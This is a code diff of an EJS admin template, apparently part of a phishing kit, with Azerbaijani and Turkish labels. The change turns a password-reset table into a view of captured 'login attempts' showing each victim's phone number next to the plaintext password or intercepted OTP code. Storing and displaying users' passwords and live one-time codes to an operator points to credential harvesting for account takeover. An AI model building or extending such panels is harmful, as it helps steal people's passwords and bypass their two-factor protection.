@@ -69,48 +69,50 @@
                         Şifrə Sıfırlama İstekleri
                     </h3>
                 </div>
-                <div class="card-body table-responsive p-0">
-                    <table class="table table-hover text-nowrap">
-                        <thead>
-                            <tr>
-                                <th>ID</th>
-                                <th>Telefon Nömrəsi</th>
-                                <th>Doğrulama Kodu (OTP)</th>
-                                <th>Durum</th>
-                                <th>Müraciət Tarixi</th>
-                                <th>Doğrulama Tarixi</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <% submissions.forEach(r => { %>
-                                <tr>
-                                    <td><%= r.id %></td>
-                                    <td><%= r.phoneNumber %></td>
-                                    <td><strong><%= r.otpCode || 'Gözlənilir...' %></strong></td>
-                                    <td>
-                                        <% if (r.status === 'verified') { %>
-                                            <span class="badge badge-success">Doğrulandı</span>
-                                        <% } else { %>
-                                            <span class="badge badge-warning">Gözlənilir</span>
-                                        <% } %>
-                                    </td>
-                                    <td>
-                                        <%# Tarihi formatlıyoruz %>
-                                        <%= new Date(r.createdAt).toLocaleString('az-AZ', { dateStyle: 'short', timeStyle: 'medium' }) %>
-                                    </td>
-                                    <td>
-                                        <%# Eğer doğrulama tarihi varsa formatla, yoksa '—' yaz %>
-                                        <% if (r.verifiedAt) { %>
-                                            <%= new Date(r.verifiedAt).toLocaleString('az-AZ', { dateStyle: 'short', timeStyle: 'medium' }) %>
-                                        <% } else { %>
-                                            —
-                                        <% } %>
-                                    </td>
-                                </tr>
-                            <% }) %>
-                        </tbody>
-                    </table>
-                </div>
+               <div class="card-body table-responsive p-0">
+    <table class="table table-hover text-nowrap">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>İşlem Tipi</th>
+                <th>Telefon Nömrəsi</th>
+                <th>Şifrə / OTP</th>
+                <th>Durum</th>
+                <th>Tarix</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% submissions.forEach(r => { %>
+                <tr>
+                    <td><%= r.id %></td>
+                    <td>
+                        <% if (r.type === 'Giriş Cəhdi') { %>
+                            <span class="badge badge-primary"><%= r.type %></span>
+                        <% } else { %>
+                            <span class="badge badge-info">Şifrə Sıfırlama</span>
+                        <% } %>
+                    </td>
+                    <td><%= r.phoneNumber %></td>
+                    <td>
+                        <strong><%= r.password || r.otpCode || 'Gözlənilir...' %></strong>
+                    </td>
+                    <td>
+                        <% if (r.status === 'verified') { %>
+                            <span class="badge badge-success">Doğrulandı</span>
+                        <% } else if (r.status === 'pending_otp') { %>
+                            <span class="badge badge-warning">Gözlənilir</span>
+                        <% } else { %>
+                           —
+                        <% } %>
+                    </td>
+                    <td>
+                        <%= new Date(r.createdAt).toLocaleString('az-AZ', { dateStyle: 'short', timeStyle: 'medium' }) %>
+                    </td>
+                </tr>
+            <% }) %>
+        </tbody>
+    </table>
+</div>
             </div>
         </section>
     </div>
